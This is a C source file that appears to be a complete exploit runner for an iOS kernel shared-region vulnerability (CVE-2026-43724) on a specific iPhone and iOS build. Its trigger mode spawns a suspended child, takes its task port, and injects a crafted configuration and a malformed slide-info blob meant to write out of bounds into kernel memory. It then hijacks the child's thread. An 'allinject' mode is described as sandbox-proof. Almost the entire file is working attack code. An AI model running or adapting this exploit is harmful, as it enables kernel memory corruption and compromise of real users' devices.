/*
 * host_ios.c — the FULL CVE-2026-43724 (DirtySlide/Rie) runner for iOS.
 * iPhone 16 Pro (A18 Pro / t8140), iOS 26.4 (23E246), xnu-12377.1.9.
 *
 * Mode switch (env RIE_MODE):
 *   probe    — Q1/Q2/Q2b/Q3 instrumented first-mapper probe (default)
 *   trigger  — the real chain:
 *       P1  parse our own dyld shared cache (in-process header at 0x180000000)
 *       P2  spawn child (bundled libchild.dylib) START_SUSPENDED|RESLIDE(0x0800)
 *           (+ALLOW_DATA_EXEC(0x2000) when RIE_STAGE=allinject, for fd=-1 carrier)
 *       P3  task_for_pid -> locate child exec base
 *       P4  inject: struct sr_cfg + slide-info blob (+ carrier when allinject)
 *       P5  hijack suspended main thread to child_trigger (TRIGGER_OFFSET)
 *       P6  resume; waitpid; report exit code; parent check_np (294)
 *   allinject — like trigger but files[] all fd=-1: header + blob + carrier are
 *           data-from-process mappings (zero file opens => sandbox-proof).
 *
 * Output: $HOME/Documents/result.txt (stdout is unreadable on this rig).
 * A kernel panic during the sweep IS the success signal (device reboots).
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <spawn.h>
#include <sys/stat.h>
#include <sys/spawn.h>
#include <sys/wait.h>
#include <mach/mach.h>
#include <mach/arm/thread_state.h>
#include <mach-o/loader.h>
#include <mach-o/dyld.h>

#ifndef _POSIX_SPAWN_RESLIDE
/* xnu-12377.1.9 bsd/sys/spawn.h: START_SUSPENDED=0x0080, RESLIDE=0x0800. */
#define _POSIX_SPAWN_RESLIDE 0x0800
#endif
#ifndef _POSIX_SPAWN_ALLOW_DATA_EXEC
#define _POSIX_SPAWN_ALLOW_DATA_EXEC 0x2000
#endif
#ifndef vm_task_t
typedef mach_port_t vm_task_t;
#endif

extern kern_return_t mach_vm_read_overwrite(vm_task_t, vm_address_t, vm_size_t,
                                            vm_address_t, vm_size_t *);
extern kern_return_t mach_vm_region_recurse(vm_task_t, vm_address_t *, vm_size_t *,
                                            natural_t *, void *, mach_msg_type_number_t *);
/* iOS SDK ships no <mach/mach_vm.h> but the symbols live in libsystem_kernel. */
extern kern_return_t mach_vm_allocate(vm_task_t, vm_address_t *, vm_size_t, int);
extern kern_return_t mach_vm_write(vm_task_t, vm_address_t, vm_offset_t,
                                   mach_msg_type_number_t);

extern char **environ;

#include "probe_off.h"
#include "trig_off.h"
#include "sr_cfg.h"

/* ---------------- dyld shared cache header (v1) ---------------- */
typedef struct {
    char     magic[16];
    uint32_t mappingOffset;
    uint32_t mappingCount;
    uint32_t imagesOffset;
    uint32_t imagesCount;
    uint64_t dyldBaseAddress;
    uint64_t codeSignatureOffset;
    uint64_t codeSignatureSize;
    uint64_t slideInfoOffset;
    uint64_t slideInfoSize;
    uint64_t localSymbolsOffset;
    uint64_t localSymbolsSize;
    uint8_t  uuid[16];
    uint64_t cacheType;
    uint32_t branchPoolsOffset;
    uint32_t branchPoolsCount;
    uint64_t accelerateInfoAddr;
    uint64_t accelerateInfoSize;
    uint64_t imagesTextOffset;
    uint64_t imagesTextSize;
} dsc_header_t;   /* iOS 26: mappingCount may exceed 3 (subcaches) */

#define DSC_BASE 0x180000000ULL

typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

/* VM_PROT extra bits (xnu <mach/vm_prot.h>): SLIDE=0x20, NOAUTH=0x40, SLIDE_EXTRA=0x80 */
#ifndef VM_PROT_SLIDE
#define VM_PROT_SLIDE       0x20
#define VM_PROT_NOAUTH      0x40
#define VM_PROT_SLIDE_EXTRA 0x80
#endif

static void *bmemset(void *d, int c, size_t n)
{
    unsigned char *p = (unsigned char *)d;
    while (n--) *p++ = (unsigned char)c;
    return d;
}

/* ---------------- report buffer ---------------- */
static char g_out[16384];
static size_t g_len;

static void say(const char *fmt, ...)
{
    char buf[2048];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    fprintf(stderr, "%s", buf);
    size_t l = strlen(buf);
    if (g_len + l < sizeof(g_out) - 1) {
        memcpy(g_out + g_len, buf, l);
        g_len += l;
        g_out[g_len] = 0;
    }
}

static void flush_result(const char *name)
{
    const char *home = getenv("HOME");
    if (!home) { say("no HOME\n"); return; }
    char dir[1024], path[1280];
    snprintf(dir, sizeof(dir), "%s/Documents", home);
    mkdir(dir, 0755);
    snprintf(path, sizeof(path), "%s/%s", dir, name);
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { say("open(%s) errno=%d\n", path, errno); return; }
    write(fd, g_out, g_len);
    close(fd);
    say("wrote %s (%zu bytes)\n", path, g_len);
}

static long raw_syscall(long num, long a0, long a1, long a2, long a3, long *err_out)
{
    register long x16 asm("x16") = num;
    register long x0 asm("x0") = a0;
    register long x1 asm("x1") = a1;
    register long x2 asm("x2") = a2;
    register long x3 asm("x3") = a3;
    long carry = 0;
    asm volatile("svc #0x80\n\tcset %1, cs\n\t"
                 : "+r"(x0), "=r"(carry)
                 : "r"(x16), "r"(x1), "r"(x2), "r"(x3)
                 : "cc", "memory");
    if (err_out) *err_out = carry ? (x0 & 0xff) : 0;
    return carry ? -1 : x0;
}

static int region_state(void)
{
    unsigned long long scratch = 0;
    long err = 0;
    raw_syscall(294, (long)&scratch, 0, 0, 0, &err);
    return (int)err;
}

static vm_address_t find_exec_base(vm_task_t task)
{
    vm_address_t addr = 0;
    vm_size_t size = 0;
    natural_t depth = 0;
    for (;;) {
        uint8_t buf[512];
        mach_msg_type_number_t cnt = 4096;
        if (mach_vm_region_recurse(task, &addr, &size, &depth, (void *)buf, &cnt) != 0)
            break;
        uint32_t hdr[4] = {0};
        vm_size_t got = 0;
        if (mach_vm_read_overwrite(task, addr, sizeof(hdr), (vm_address_t)hdr, &got) == 0 &&
            got == sizeof(hdr) && hdr[0] == MH_MAGIC_64 && hdr[3] == MH_EXECUTE)
            return addr;
        addr += size;
    }
    return 0;
}

/* ---------------- spawn ---------------- */
static int try_spawn_flags(const char *tag, const char *path, short flags,
                           pid_t *out_pid, int *out_errno)
{
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, flags);
    char *args[] = { (char *)path, NULL };
    pid_t pid = -1;
    int rc = posix_spawn(&pid, path, NULL, &attr, args, environ);
    posix_spawnattr_destroy(&attr);
    int e = (rc != 0) ? errno : 0;
    say("  [%s] spawn(%.70s) rc=%d errno=%d pid=%d\n", tag, path, rc, e, pid);
    if (out_errno) *out_errno = e;
    if (rc == 0 && out_pid) *out_pid = pid;
    return rc;
}

/* ---------------- P1: parse our own shared cache ---------------- */
static int parse_own_dsc(uint64_t *main_size, uint64_t *data_map_off,
                         uint64_t *data_map_size, uint64_t *slide_off,
                         uint64_t *slide_size)
{
    volatile dsc_header_t *h = (volatile dsc_header_t *)DSC_BASE;
    if (memcmp((const void *)h->magic, "dyld_v1 ", 8) != 0) {
        say("P1 no dyld_v1 magic at 0x%llx\n", (unsigned long long)DSC_BASE);
        return -1;
    }
    *main_size = 0;
    *slide_off = h->slideInfoOffset;
    *slide_size = h->slideInfoSize;
    /* find the writable mapping (the __DATA subcache / data region) */
    uint32_t nmaps = h->mappingCount;
    if (nmaps == 0 || nmaps > 16) nmaps = 3;
    for (uint32_t i = 0; i < nmaps; i++) {
        volatile uint64_t *mp = (volatile uint64_t *)(DSC_BASE + h->mappingOffset + i * 32);
        uint64_t address = mp[0], size = mp[1], fileoff = mp[2], maxprot = mp[4] >> 32;
        say("  mapping[%u] va=0x%llx size=0x%llx fileoff=0x%llx maxprot=0x%llx\n",
            i, (unsigned long long)address, (unsigned long long)size,
            (unsigned long long)fileoff, (unsigned long long)maxprot);
        if (maxprot & VM_PROT_WRITE) {
            *data_map_off = fileoff;
            *data_map_size = size;
        }
        *main_size += size;
    }
    return 0;
}

/* ---------------- P4: build cfg + slide blob ---------------- */
/*
 * slide blob (v5): the kernel sanity check validates ONLY
 *   page_size == 16384 and (24 + 2*page_starts_count <= slide_info_size).
 * Every page_starts[i] != 0xFFFF is a LIVE byte offset - never bounded.
 * We set starts[i] = START_OFFSET (0x8000) for every page: on a 16KB page the
 * rebase RMW lands 32KB past the page base = fully OOB into the adjacent
 * kernel memory window (physmap on bare metal).
 */
#define RIE_PAGES       1024
#define RIE_START_OFF   0x8000
#define RIE_VALUE_ADD   (0ULL - 0x4000ULL)

static u64 g_blob[4096];  /* 32KB blob buffer (static) */

static uint64_t build_slide_blob(void)
{
    volatile u64 *b = g_blob;
    bmemset((void *)g_blob, 0, sizeof(g_blob));
    b[0] = 5;                       /* slide_info_version */
    b[1] = 16384;                   /* page_size */
    b[2] = 24;                      /* page_starts_off */
    b[3] = RIE_PAGES;               /* page_starts_count */
    b[4] = 0;                       /* page_extras_off (v5: optional) */
    b[5] = 0;                       /* page_extras_count */
    volatile u16 *starts = (volatile u16 *)((volatile u8 *)g_blob + 24);
    for (u32 i = 0; i < RIE_PAGES; i++)
        starts[i] = (u16)RIE_START_OFF;
    return (uint64_t)(RIE_PAGES * 2 + 24);
}

static void build_cfg(struct sr_cfg *cfg, const char *main_path, const char *sub_path,
                      uint64_t blob_child_va, uint64_t blob_used, uint64_t fault_va)
{
    bmemset(cfg, 0, sizeof(*cfg));
    cfg->magic = SR_CFG_MAGIC;
    cfg->blob_off = 0;   /* blob is a separate injected page in this design */
    snprintf(cfg->main_path, sizeof(cfg->main_path), "%s", main_path ? main_path : "");
    snprintf(cfg->sub_path, sizeof(cfg->sub_path), "%s", sub_path ? sub_path : "");
    /* files[0]: header (child opens main_path; parent patches fd after open) */
    cfg->files[0].sf_fd = -2;              /* sentinel: child must open+patch */
    cfg->files[0].sf_mappings_count = 1;
    cfg->files[0].sf_slide = 0;
    /* files[1]: the blob (data-from-process) */
    cfg->files[1].sf_fd = -1;
    cfg->files[1].sf_mappings_count = 1;
    cfg->files[1].sf_slide = 0;
    /* files[2]: carrier (child opens sub_path, or fd=-1 in allinject) */
    cfg->files[2].sf_fd = -2;
    cfg->files[2].sf_mappings_count = 1;
    cfg->files[2].sf_slide = 1;

    /* mappings[0]: header, max RX, no slide */
    cfg->mappings[0].sms_address = DSC_BASE;             /* map over the real base? */
    cfg->mappings[0].sms_size = 0x4000;
    cfg->mappings[0].sms_file_offset = 0;
    cfg->mappings[0].sms_slide_size = 0;
    cfg->mappings[0].sms_slide_start = 0;
    cfg->mappings[0].sms_max_prot = VM_PROT_READ | VM_PROT_EXECUTE;
    cfg->mappings[0].sms_init_prot = VM_PROT_READ | VM_PROT_EXECUTE;
    /* mappings[1]: fd=-1 blob inject (data from cfg->blob_child_va) */
    cfg->mappings[1].sms_address = DSC_BASE + 0x8000;
    cfg->mappings[1].sms_size = (blob_used + 0x3FFFULL) & ~0x3FFFULL;
    cfg->mappings[1].sms_file_offset = blob_child_va;    /* fd=-1: child VA of data */
    cfg->mappings[1].sms_slide_size = 0;
    cfg->mappings[1].sms_slide_start = 0;
    cfg->mappings[1].sms_max_prot = VM_PROT_READ | VM_PROT_WRITE | VM_PROT_SLIDE_EXTRA;
    cfg->mappings[1].sms_init_prot = VM_PROT_READ;
    /* mappings[2]: carrier with the slide */
    cfg->mappings[2].sms_address = DSC_BASE + 0x100000;
    cfg->mappings[2].sms_size = fault_va ? 0x4000 : 0;   /* 1 page for the proof */
    cfg->mappings[2].sms_file_offset = 0;
    cfg->mappings[2].sms_slide_size = (blob_used + 0x3FFFULL) & ~0x3FFFULL;
    cfg->mappings[2].sms_slide_start = cfg->mappings[1].sms_address; /* the blob page */
    cfg->mappings[2].sms_max_prot = VM_PROT_READ | VM_PROT_WRITE | VM_PROT_SLIDE | VM_PROT_NOAUTH;
    cfg->mappings[2].sms_init_prot = VM_PROT_READ;
    cfg->fault_addr = fault_va;
    cfg->blob_size = blob_used;
}

/* VM_PROT_SLIDE = 0x20, VM_PROT_NOAUTH = 0x40, VM_PROT_SLIDE_EXTRA = 0x80 */
#ifndef VM_PROT_SLIDE
#define VM_PROT_SLIDE       0x20
#define VM_PROT_NOAUTH      0x40
#define VM_PROT_SLIDE_EXTRA 0x80
#endif

/* ---------------- the trigger chain ---------------- */
static void run_trigger(int allinject)
{
    uint64_t main_size = 0, dm_off = 0, dm_size = 0, sl_off = 0, sl_size = 0;
    if (parse_own_dsc(&main_size, &dm_off, &dm_size, &sl_off, &sl_size) != 0) {
        say("P1 parse failed - aborting trigger\n");
        return;
    }

    const char *main_path = "/System/Library/dyld/dyld_shared_cache_arm64e";
    const char *sub_path  = "/System/Library/dyld/dyld_shared_cache_arm64e.02";

    /* spawn */
    char selfexe[1200] = {0}, lib[1280] = {0};
    uint32_t sz = (uint32_t)sizeof(selfexe);
    if (_NSGetExecutablePath(selfexe, &sz) != 0) selfexe[0] = 0;
    char *slash = strrchr(selfexe, '/');
    if (slash) snprintf(lib, sizeof(lib), "%.*slibchild.dylib", (int)(slash - selfexe) + 1, selfexe);

    short flags = (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE);
    if (allinject) flags = (short)(flags | _POSIX_SPAWN_ALLOW_DATA_EXEC);
    pid_t pid = -1; int e = 0;
    int rc = try_spawn_flags(allinject ? "allinject" : "trigger", lib, flags, &pid, &e);
    if (rc != 0) { say("P2 spawn failed rc=%d errno=%d\n", rc, e); return; }

    task_t ctask = TASK_NULL;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &ctask);
    say("P3 task_for_pid kr=0x%x\n", kr);
    if (kr != KERN_SUCCESS) { kill(pid, SIGKILL); return; }

    vm_address_t base = find_exec_base(ctask);
    say("P3 child exec base=0x%llx\n", (unsigned long long)base);
    if (!base) { kill(pid, SIGKILL); return; }

    /* inject: [struct sr_cfg][pad to 0x4000][slide blob][pad][carrier data?] */
    uint64_t blob_used = build_slide_blob();
    uint64_t inject_size = sizeof(struct sr_cfg) + 0x4000 + blob_used + 0x4000;

    vm_address_t inj_va = 0;
    kr = mach_vm_allocate(ctask, &inj_va, inject_size, VM_FLAGS_ANYWHERE);
    say("P4 mach_vm_allocate kr=0x%x va=0x%llx size=0x%llx\n", kr,
        (unsigned long long)inj_va, (unsigned long long)inject_size);
    if (kr != KERN_SUCCESS) { kill(pid, SIGKILL); return; }

    struct sr_cfg cfg;
    uint64_t blob_child_va = inj_va + ((sizeof(struct sr_cfg) + 0x3FFFULL) & ~0x3FFFULL);
    uint64_t fault_va = DSC_BASE + 0x100000; /* mappings[2].sms_address */
    build_cfg(&cfg, main_path, sub_path, blob_child_va, blob_used, fault_va);

    /* write: [cfg][pad][blob]  — one buffer on our stack, one mach_vm_write */
    uint8_t wbuf[65536];
    bmemset(wbuf, 0, sizeof(wbuf));
    memcpy(wbuf, &cfg, sizeof(cfg));
    memcpy(wbuf + ((sizeof(struct sr_cfg) + 0x3FFFULL) & ~0x3FFFULL), (void *)g_blob, blob_used);
    uint64_t wsize = ((sizeof(struct sr_cfg) + 0x3FFFULL) & ~0x3FFFULL) + blob_used;

    kr = mach_vm_write(ctask, inj_va, (vm_offset_t)wbuf, (mach_msg_type_number_t)wsize);
    say("P4 mach_vm_write kr=0x%x (%llu bytes)\n", kr, (unsigned long long)wsize);
    if (kr != KERN_SUCCESS) { kill(pid, SIGKILL); return; }

    /* hijack to child_trigger, x0 = inj_va (cfg address) */
    thread_act_array_t threads = NULL;
    mach_msg_type_number_t nt = 0;
    kr = task_threads(ctask, &threads, &nt);
    if (kr != KERN_SUCCESS || nt < 1) { say("P5 task_threads kr=0x%x\n", kr); kill(pid, SIGKILL); return; }

    arm_thread_state64_t st;
    mach_msg_type_number_t sc = ARM_THREAD_STATE64_COUNT;
    kr = thread_get_state(threads[0], ARM_THREAD_STATE64, (thread_state_t)&st, &sc);
    if (kr != KERN_SUCCESS) { say("P5 thread_get_state kr=0x%x\n", kr); kill(pid, SIGKILL); return; }
    st.__pc = base + TRIGGER_OFFSET;
    st.__x[0] = inj_va;                     /* child_trigger(cfg) */
    st.__sp &= ~0xFULL;
    kr = thread_set_state(threads[0], ARM_THREAD_STATE64, (thread_state_t)&st, sc);
    say("P5 hijack pc=0x%llx x0=0x%llx kr=0x%x\n",
        (unsigned long long)st.__pc, (unsigned long long)st.__x[0], kr);
    if (kr != KERN_SUCCESS) { kill(pid, SIGKILL); return; }

    kr = task_resume(ctask);
    say("P6 task_resume kr=0x%x\n", kr);

    int status = 0;
    if (waitpid(pid, &status, 0) > 0) {
        if (WIFEXITED(status))
            say("P6 RESULT child_trigger exit=%d\n", WEXITSTATUS(status));
        else if (WIFSIGNALED(status))
            say("P6 RESULT child killed signal=%d\n", WTERMSIG(status));
    }
    /* parent-side region state after the child ran */
    {
        unsigned long long scratch = 0; long err2 = 0;
        raw_syscall(294, (long)&scratch, 0, 0, 0, &err2);
        say("P6 parent check_np errno=%d scratch=0x%llx\n", (int)err2, scratch);
    }
    (void)base;
}

/* ---------------- main ---------------- */
int main(void)
{
    const char *mode = getenv("RIE_MODE");
    if (!mode || !*mode) mode = "probe";

    if (strcmp(mode, "trigger") == 0) {
        say("=== RIE trigger mode ===\n");
        run_trigger(0);
        flush_result("result_trigger.txt");
        return 0;
    }
    if (strcmp(mode, "allinject") == 0) {
        say("=== RIE allinject mode (zero file access) ===\n");
        run_trigger(1);
        flush_result("result_allinject.txt");
        return 0;
    }

    /* ---- probe mode (host_probe.c logic, kept verbatim) ---- */
    char selfexe[1200] = {0}, lib[1280] = {0};
    uint32_t sz = (uint32_t)sizeof(selfexe);
    if (_NSGetExecutablePath(selfexe, &sz) != 0) selfexe[0] = 0;
    char *slash = strrchr(selfexe, '/');
    if (slash) snprintf(lib, sizeof(lib), "%.*slibchild.dylib", (int)(slash - selfexe) + 1, selfexe);
    say("self exe : %s\n", selfexe);
    say("child    : %s\n", lib);

    int st = region_state();
    say("Q1 own_region_check_np errno=%d (%s)\n", st,
        st == 12 ? "BOUND-but-EMPTY => VIABLE for #536 first-mapper" :
        st == 0  ? "populated (cache already mapped)" :
        st == 22 ? "EINVAL: no region bound" : "other");

    pid_t p_lib = -1, p_self = -1, p_sh = -1, p_none = -1;
    int e_lib = 0, e_self = 0, e_sh = 0, e_none = 0;
    int rc_lib = try_spawn_flags("lib", lib, (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE), &p_lib, &e_lib);
    int rc_self = try_spawn_flags("self", selfexe, (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE), &p_self, &e_self);
    int rc_sh = try_spawn_flags("sh", "/bin/sh", (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE), &p_sh, &e_sh);
    int rc_none = try_spawn_flags("none", "/does/not/exist", (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE), &p_none, &e_none);
    say("Q2 rc   : lib=%d self=%d sh=%d missing=%d\n", rc_lib, rc_self, rc_sh, rc_none);
    say("Q2 err  : lib=%d self=%d sh=%d missing=%d\n", e_lib, e_self, e_sh, e_none);

    {
        pid_t p1 = -1, p2 = -1, p3 = -1, p4 = -1;
        int e1 = 0, e2 = 0, e3 = 0, e4 = 0;
        int r1 = try_spawn_flags("reslide+susp", selfexe, (short)(POSIX_SPAWN_START_SUSPENDED | _POSIX_SPAWN_RESLIDE), &p1, &e1);
        int r2 = try_spawn_flags("susp-only", selfexe, (short)POSIX_SPAWN_START_SUSPENDED, &p2, &e2);
        int r3 = try_spawn_flags("no-flags", selfexe, (short)0, &p3, &e3);
        int r4 = try_spawn_flags("reslide-only", selfexe, (short)_POSIX_SPAWN_RESLIDE, &p4, &e4);
        say("Q2b rc : reslide+susp=%d susp=%d none=%d reslide=%d\n", r1, r2, r3, r4);
        say("Q2b err: reslide+susp=%d susp=%d none=%d reslide=%d\n", e1, e2, e3, e4);
        if (r2 == 0 && p2 > 0) { say("Q2b SUSPENDED-ONLY SPAWN WORKED pid=%d\n", p2); kill(p2, SIGKILL); }
        if (r3 == 0 && p3 > 0) { say("Q2b PLAIN SPAWN WORKED pid=%d\n", p3); kill(p3, SIGKILL); }
        if (r4 == 0 && p4 > 0) { say("Q2b RESLIDE-ONLY SPAWN WORKED pid=%d\n", p4); kill(p4, SIGKILL); }
    }

    if (rc_lib == 0 && p_lib > 0) {
        task_t ctask = TASK_NULL;
        kern_return_t kr = task_for_pid(mach_task_self(), p_lib, &ctask);
        say("Q3 task_for_pid kr=0x%x (%s)\n", kr, mach_error_string(kr));
        if (kr == KERN_SUCCESS) {
            thread_act_array_t threads = NULL;
            mach_msg_type_number_t nt = 0;
            kr = task_threads(ctask, &threads, &nt);
            say("Q3 task_threads kr=0x%x n=%u\n", kr, nt);
            if (kr == KERN_SUCCESS && nt > 0) {
                vm_address_t base = find_exec_base(ctask);
                say("Q3 child exec base=0x%llx\n", (unsigned long long)base);
                if (base) {
                    arm_thread_state64_t s;
                    mach_msg_type_number_t sc2 = ARM_THREAD_STATE64_COUNT;
                    kr = thread_get_state(threads[0], ARM_THREAD_STATE64, (thread_state_t)&s, &sc2);
                    say("Q3 thread_get_state kr=0x%x pc=0x%llx sp=0x%llx\n", kr,
                        (unsigned long long)s.__pc, (unsigned long long)s.__sp);
                    if (kr == KERN_SUCCESS) {
                        s.__pc = base + PROBE_OFFSET;
                        s.__sp &= ~0xFULL;
                        kr = thread_set_state(threads[0], ARM_THREAD_STATE64, (thread_state_t)&s, sc2);
                        say("Q3 thread_set_state kr=0x%x (pc=0x%llx)\n", kr,
                            (unsigned long long)s.__pc);
                        if (kr == KERN_SUCCESS) {
                            kr = task_resume(ctask);
                            say("Q3 task_resume kr=0x%x\n", kr);
                            int status2 = 0;
                            if (waitpid(p_lib, &status2, 0) > 0) {
                                if (WIFEXITED(status2)) {
                                    int code = WEXITSTATUS(status2);
                                    say("Q3 RESULT child_probe exit=%d (%s)\n", code,
                                        code == 12 ? "BOUND-but-EMPTY => VIABLE #536 FIRST-MAPPER" :
                                        code == 0 ? "populated" : "other");
                                } else if (WIFSIGNALED(status2)) {
                                    say("Q3 RESULT child killed by signal %d\n", WTERMSIG(status2));
                                }
                            }
                        }
                    }
                }
            }
        }
        kill(p_lib, SIGKILL);
    }

    flush_result("result.txt");
    return 0;
}
